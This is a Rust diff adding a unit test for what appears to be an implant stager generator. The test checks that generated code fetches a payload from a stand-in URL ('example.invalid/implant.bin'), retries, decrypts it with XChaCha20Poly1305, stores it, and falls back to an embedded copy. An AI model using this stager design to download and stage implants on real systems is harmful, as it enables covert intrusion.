@@ -238,6 +238,103 @@ fn the_embedded_fallback_renders_the_fall_through() {
     );
 }
 
+/// The brace-balanced block after the first `{` that follows `marker`, so the
+/// assertions below can look at one generated function instead of the whole
+/// fragment.
+fn block_after<'a>(source: &'a str, marker: &str) -> Option<&'a str> {
+    let marker_at = source.find(marker)?;
+    let open = marker_at + source.get(marker_at..)?.find('{')?;
+    let rest = source.get(open..)?;
+    let mut depth = 0usize;
+    for (offset, ch) in rest.char_indices() {
+        match ch {
+            '{' => depth += 1,
+            '}' => {
+                depth = depth.saturating_sub(1);
+                if depth == 0 {
+                    return source.get(open..=open + offset);
+                }
+            }
+            _ => {}
+        }
+    }
+    None
+}
+
+#[test]
+fn a_successful_retry_reaches_decryption_and_storage() {
+    for fallback in [StagerFallback::None, StagerFallback::Embedded] {
+        let mut stager = params("https://example.invalid/implant.bin");
+        stager.fallback = fallback;
+        stager.retries = 2;
+        stager.crypto = super::StagerCrypto::XChaCha20Poly1305;
+        stager.key = Some("aa".to_string());
+        stager.nonce = Some("bb".to_string());
+        let fragment = stager.render_fragment(&strings());
+
+        // The bytes and the last error live in separate slots, and the loop
+        // breaks on a success before any error can be recorded for it.
+        assert!(fragment.contains("let mut fetched: Option<Vec<u8>> = None;"));
+        assert!(fragment.contains("let mut last_error: Option<String> = None;"));
+        assert!(
+            !fragment.contains("failure = Some"),
+            "an attempt's failure must not overwrite an earlier success: {fragment}"
+        );
+        let attempts = block_after(&fragment, "for _ in 0..=").expect("the retry loop is missing");
+        let success = attempts
+            .find("fetched = Some(bytes);")
+            .expect("the success arm is missing");
+        let failure = attempts
+            .find("last_error = Some(e);")
+            .expect("the failure arm is missing");
+        assert!(
+            success < failure,
+            "the success arm must come first in the loop: {attempts}"
+        );
+
+        // The outcome is decided on the bytes: the last error is consulted only
+        // in the `None` arm, so a success can never fall into it.
+        let decision =
+            block_after(&fragment, "fn staged_fetch").expect("the outcome helper is missing");
+        let fetched = decision
+            .find("Some(bytes) => Ok(bytes)")
+            .expect("the success outcome is missing");
+        let exhausted = decision
+            .find("None => match last_error")
+            .expect("the exhausted outcome is missing");
+        assert!(
+            fetched < exhausted,
+            "the fetch result must win before the last error: {decision}"
+        );
+
+        // A success therefore always runs on to decryption and storage, while
+        // the failure branch sits behind the `Err` arm of the outcome.
+        let run = block_after(&fragment, "fn run_exec").expect("run_exec is missing");
+        let outcome = run
+            .find("match staged_fetch(fetched, last_error)")
+            .expect("the outcome match is missing");
+        let decrypt = run.find("decrypt_staged").expect("decryption missing");
+        let store = run.find("store_staged_payload").expect("storage missing");
+        assert!(
+            outcome < decrypt && decrypt < store,
+            "a successful fetch must reach decryption and storage: {run}"
+        );
+
+        let branch = match fallback {
+            StagerFallback::None => "return Err(e);",
+            StagerFallback::Embedded => "the embedded copy is used",
+        };
+        let branch_at = match run.find(branch) {
+            Some(at) => at,
+            None => panic!("the failure branch is missing: {run}"),
+        };
+        assert!(
+            outcome < branch_at,
+            "the failure branch must only follow the outcome: {run}"
+        );
+    }
+}
+
 #[test]
 fn scp_url_is_parsed_into_a_target_and_port() {
     assert_eq!(
